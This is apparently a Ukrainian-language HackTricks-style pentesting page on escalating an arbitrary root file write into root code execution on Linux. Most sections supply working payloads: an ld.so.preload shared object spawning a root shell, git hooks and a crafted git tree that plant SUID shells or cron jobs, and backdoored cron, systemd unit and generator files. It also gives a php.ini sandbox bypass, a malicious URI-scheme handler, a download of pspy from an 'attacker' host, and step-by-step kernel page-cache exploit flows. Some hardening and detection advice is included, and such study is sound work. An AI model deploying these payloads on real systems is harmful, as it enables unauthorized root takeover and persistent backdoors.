# Произвольний запис файлів від імені Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` — це системний список shared objects, які dynamic linker завантажує перед іншими shared objects. Режим secure-execution застосовує додаткові обмеження до preloading, тому шлях до library на кшталт `/tmp/pe.so` не є універсальною технікою для SUID-binary.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить вказану library перед іншими shared objects, що дає змогу виконати code у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати дані до теки `.git`**, hook можна використати для **підвищення привілеїв**.<sup>[[13]](#references)</sup>

Наприклад, можна **створити скрипт** у git-репозиторії в **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Path traversal під час експорту привілейованого Git tree

Привілейований synchronizer може уникати `checkout`, натомість перераховувати репозиторій під контролем атакувальника за допомогою `git ls-tree`, читати кожен blob через `git cat-file`, об'єднувати вказаний pathname із staging directory та самостійно записувати його. Це перетворюється на **arbitrary file write із привілеями synchronizer**, коли разом використовуються `-c safe.directory=*` (що вимикає перевірку Git для репозиторіїв із іншим власником) і відсутня перевірка containment для destination. Абсолютне ім'я tree-entry змушує Python-метод `os.path.join(stage, name)` відкинути `stage`; відносне ім'я, що містить `../`, виходить за його межі під час розв'язання файловою системою. Оскільки application матеріалізує raw tree замість того, щоб попросити Git виконати `checkout`, відхилення pathname під час checkout ніколи не захищає sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Шукайте таку структуру коду в root services, timers, deployment agents, template importers і backup/restore jobs:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Запис дерева кодується як `<mode> SP <name> NUL <raw object ID>`. Параметр `git hash-object --literally` навмисно дозволяє дані об’єкта, які звичайний синтаксичний аналіз або `git fsck` можуть відхилити, тому disposable clone може створити дерево, ім’я файлу якого є абсолютним призначенням. У цьому прикладі створюється blob cron-файлу, створене дерево обгортається в commit, а branch переміщується на нього; для експлуатації все одно потрібні права на оновлення repository, який використовує privileged job, і Git server, що приймає некоректний об’єкт.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Захист має охоплювати як імпорт репозиторіїв, так і кінцеву операцію з файловою системою:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Замініть `safe.directory=*` на точні репозиторії, яким сервіс має довіряти, і за можливості виконуйте обробку репозиторіїв без привілеїв root.
- Відхиляйте абсолютні імена та будь-які компоненти `.` або `..` до матеріалізації. Після об'єднання канонізуйте шлях і перевіряйте, що призначення залишається в межах визначеного кореня.
- Уникайте symlink race між перевіркою та відкриттям: відкривайте відносно довіреного дескриптора каталогу, а в Linux для шляхів, контрольованих атакувальником, використовуйте `openat2()` з `RESOLVE_BENEATH` і `RESOLVE_NO_SYMLINKS`.
- Надавайте перевагу звичайному checkout в ізольованому каталозі замість повторної реалізації checkout на основі plumbing output. Якщо потрібен raw-object ingestion, увімкніть валідацію на стороні receive, наприклад `receive.fsckObjects=true`; не знижуйте рівень перевірок `receive.fsck.*`, пов'язаних із іменами шляхів, необхідних для відхилення crafted trees.

### Cron і файли часу

Якщо ви можете **записувати файли, пов'язані з cron, які виконує root**, зазвичай можна отримати виконання коду під час наступного запуску завдання. Цікаві цілі включають:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і сервіси, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове завдання root cron** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Вбудувати backdoor у наявну ціль timer**, змінивши скрипт або binary, який вона запускає

Мінімальний приклад payload для cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати лише в каталог cron, який використовується `run-parts`, натомість розмістіть там виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Примітки:

- `run-parts` зазвичай ігнорує імена файлів, що містять крапки, тому краще використовувати імена на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли служб і сокетів

Якщо ви можете записувати **файли юнітів `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду від імені root, перезавантаживши та перезапустивши юніт, або дочекавшись спрацьовування шляху активації служби/сокета.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Цікаві цілі:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Перевизначення drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Скрипти/двійкові файли служб, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажує служба root

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Поширені способи зловживання:

- **Перезаписати `ExecStart=`** у service unit, що належить root, якщо ви можете його змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Вбудувати backdoor у script/binary**, на який уже посилається unit
- **Перехопити socket-activated service**, змінивши відповідний `.service` файл, який запускається, коли socket отримує підключення

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий процес активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете самостійно перезапустити сервіси, але можете редагувати socket-activated unit, вам може бути достатньо **дочекатися підключення клієнта**, щоб запустити backdoored service від імені root.<sup>[[17]](#references)</sup>

### systemd generator directories

**System generators** — це виконувані файли, які system manager запускає перед завантаженням unit files під час завантаження системи та перезавантаження конфігурації. Тому доступ на запис до system-generator directory (або до наявного executable generator) є прямим примітивом виконання коду від імені root, який легко пропустити, якщо під час аудиту перевіряються лише файли `*.service` і `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Звичайний порядок пошуку: `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` і `/usr/lib/systemd/system-generators/` (деякі дистрибутиви надають `/lib/systemd/system-generators/` через об’єднання `/usr`). Виконуваний файл з однаковим іменем у попередньому каталозі перекриває файл у наступному. Не плутайте ці **input executable directories** з `/run/systemd/generator`, `/run/systemd/generator.early` і `/run/systemd/generator.late`, які містять тимчасовий unit output, створений generators.<sup>[[35]](#references)</sup>

Швидкі перевірки:
```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
/usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
/lib/systemd/system-generators; do
[ -e "$d" ] || continue
namei -l "$d"
find "$d" -maxdepth 1 -writable -ls 2>/dev/null
getfacl -p "$d" "$d"/* 2>/dev/null
done
```
Нещодавно створений генератор має отримати встановлений біт виконання. Якщо write primitive керує байтами, але не mode, виберіть уже виконуваний генератор; його усікання на місці зазвичай зберігає метадані. Якщо сам каталог доступний для запису, створіть новий entry і позначте його як виконуваний.<sup>[[35]](#references)</sup>
```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```
Запуск `systemctl daemon-reload` для **system** manager потребує відповідної авторизації, але він повторно запускає кожен system generator; інакше потрібно дочекатися привілейованого reload, операції з пакетом або reboot. Каталоги user-generator, такі як `~/.config/systemd/user-generators/`, виконуються в user manager і самі по собі не надають root.<sup>[[35]](#references)</sup>

Для hardening і hunting перевіряйте кожен компонент шляху та ACL, а не лише кінцеві біти режиму доступу, створіть baseline хешів і власності пакетів для generators та налаштуйте сповіщення про create, rename, зміни вмісту або дозволів у всіх каталогах вхідних даних system-generator. Моніторинг запису важливий, оскільки one-shot generator може видалити себе після виконання, тоді як згенероване дерево unit у `/run/systemd/generator*` перебудовується під час наступного reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Перезаписати обмежувальний `php.ini`, який використовує привілейована PHP sandbox

Деякі custom daemons перевіряють наданий користувачем PHP, запускаючи `php` з **обмежувальним `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо код у sandbox все ще має **будь-який примітив запису** (наприклад, `file_put_contents`) і ви можете отримати доступ до **точного шляху `php.ini`**, який використовує daemon, ви можете **перезаписати цю конфігурацію**, щоб зняти обмеження, а потім надіслати другий payload, який виконається з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий flow:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код, оскільки небезпечні функції знову ввімкнено.

Мінімальний приклад (замініть шлях, який використовує daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon працює від імені root (або перевіряє шляхи, власником яких є root), друге виконання відбувається в контексті root. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли runtime у sandbox все ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає реєстрації через `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з interpreter. Вплив на привілеї залежить від того, хто може змінювати реєстрацію і який процес згодом виконує відповідний файл, тому перевірте ці вимоги, перш ніж розглядати це як шлях до підвищення привілеїв.<sup>[[21]](#references)</sup>

### Перезапис обробників схем (наприклад, http: або https:)

Desktop environments використовують MIME associations і desktop entries, щоб вибрати застосунок для URI-схем; атакувальник, який може записувати у відповідні per-user configuration і desktop-entry directories, може перенаправити ці схеми до launcher, яким він керує. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники HTTP- і HTTPS-URL вказували на malicious file (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), клік користувача може запустити цей desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Скрипти/бінарні файли, доступні для запису користувачу, які виконує root

Якщо привілейований workflow запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який бінарний файл у каталозі, що належить непривілейованому користувачу), ви можете перехопити його:<sup>[[1]](#references)</sup>

- **Виявлення виконання:** відстежуйте процеси за допомогою pspy, щоб виявити запуск root шляхів, контрольованих користувачем.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу та доступні йому для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу дію від root), потім відновіть permissions:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть привілейовану дію** (наприклад, натисніть кнопку UI, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

### Модифікація привілейованих бінарних файлів лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дозволяють змінювати лише **копію в page cache** читабельного файлу. Якщо націлитися на **setuid** або інший бінарний файл, який виконується root, наступний запуск може виконати контрольовані attacker'ом байти з пам'яті та підвищити привілеї, навіть якщо hash файлу на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **примітив запису файлу лише під час runtime**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode та байти на диску не змінюються
- **Пам'ять є зміненою**: процеси, які читають або виконують cached page, отримують вміст, змінений attacker'ом
- **Ефект тимчасовий**: зміна зникає після reboot або eviction cache

Цей примітив займає проміжне місце між класичним **arbitrary file write** і старішими bugs зі зловживанням page cache, такими як Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо позиції запису
- Примітив, що працює лише в page cache, може бути надійнішим, якщо вразливий path надає прямий запис у cached file-backed pages

#### Generic privesc flow

1. Отримати kernel primitive, здатний записувати у **file-backed page cache pages**
2. Використати його проти **читабельного привілейованого бінарного файлу** або іншого файлу, який виконується root
3. Запустити виконання **до** того, як page буде видалено з cache
4. Отримати code execution від імені root, поки файл на диску все ще виглядає незміненим

Типові цілі з високою цінністю:

- Бінарні файли **setuid-root**
- Helpers, які запускаються **root services**
- Бінарні файли, які часто виконуються з **containers, що спільно використовують kernel/page cache хоста**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) є хорошим прикладом цього класу. Вразливий path знаходився в Linux crypto userspace API (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати references на page-cache pages з читабельного файлу до crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source та destination buffers
- `authencesn` після цього записував у destination tag region
- коли ця region усе ще посилалася на spliced file-backed pages, запис потрапляв у **page cache цільового файлу**

Отже, цікавою є не сама CVE, а pattern:

- **передати file-backed cache pages до kernel subsystem**
- змусити subsystem **розглядати їх як writable output**
- виконати невелике контрольоване overwrite у пам'яті

У public PoC використовувалися повторювані **4-byte writes** для patch `/usr/bin/su` у пам'яті, після чого його виконували.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого pattern **page-cache-only write-to-root**, але цього разу sink — це **IPsec ESP decrypt**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливою технікою є **metadata-laundering step**:

- `splice()` розміщує **read-only file-backed page-cache page** в ESP-in-UDP packet
- початкове DirtyFrag mitigation позначало цей skb прапором `SKBFL_SHARED_FRAG`, щоб `esp_input()` **копіював перед decrypt**
- netfilter `TEE` дублює packet через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone зберігає **те саме physical page-cache reference**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає clone безпечним і виконує **in-place `cbc(aes)` decrypt** поверх file-backed page

Отже, урок для reviewer ширший за саму CVE: якщо mitigation покладається на **skb/page metadata**, щоб визначити, чи потрібно спочатку виконати copy, будь-який **clone/copy path, який зберігає backing page, але видаляє metadata**, може непомітно знову відкрити примітив запису.

Типовий exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` всередині приватного network namespace**
2. підняти loopback і встановити **netfilter `TEE` rule** у `mangle/OUTPUT`
3. встановити **XFRM ESP transport SAs** через `NETLINK_XFRM`
4. закодувати кожне цільове 4-byte word у полі SA `seq_hi` (trick вибору word у DirtyFrag)
5. надіслати spliced ESP-in-UDP packet, щоб **TEE clone** досяг `esp_input()` і виконав decrypt **in place**
6. повторювати, доки page-cache copy `/usr/bin/su` або іншого привілейованого executable не міститиме code, контрольований attacker'ом

З операційної точки зору impact такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **mutated page-cache bytes** і надає root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні перевірки exposure для цього варіанта:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Короткострокове зменшення attack surface тут також залежить від конкретного шляху: оновлення до kernel, що містить `48f6a5356a33`, виправляє шлях clone, тоді як блокування autoload `xt_TEE` усуває **етап відмивання прапорців**, а блокування `esp4` / `esp6` усуває **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте цей клас bug, не покладайтеся лише на перевірки цілісності диска. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Наведені нижче значення конфігурації розрізняють завантажуваний інтерфейс і інтерфейс, вбудований у kernel; правила crypto build зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` може завантажуватися та вивантажуватися як модуль
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у kernel
- бінарні файли setuid є хорошими цілями, оскільки patch, що працює лише з page cache, може бути достатнім для перетворення локального foothold на root

#### Зменшення attack surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається завантажуваним модулем:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо це скомпільовано в ядро, у деяких повідомленнях про розкриття зазначалося, що шлях init блокується:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Цей вид mitigation варто пам’ятати й для інших kernel LPE: якщо exploitation залежить від певного optional interface, його disabling або blacklisting може перервати exploit path ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo — hijacking root-скрипта в доступному для запису користувачем каталозі PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ щодо Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Розкриття інформації Openwall oss-security щодо CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення Linux stable: crypto: algif_aead — повернення до роботи out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і exploitation варіанта Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попередня mitigation у Linux: встановлення `SKBFL_SHARED_FRAG` для spliced UDP-пакетів (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — сторінка посібника Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Асоціації MIME Applications](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: уразливість page cache Linux kernel у AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Документація Git щодо `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Документація Git щодо `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Документація щодо конфігурації Git](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/openat2.2.html)
- [35] [Документація щодо generator systemd](https://github.com/systemd/systemd/blob/main/man/systemd.generator.xml)
- [36] [Elastic Security Labs — Linux Detection Engineering: механізми persistence](https://www.elastic.co/security-labs/threat-command/primer-on-persistence-mechanisms)
{{#include ../../banners/hacktricks-training.md}}
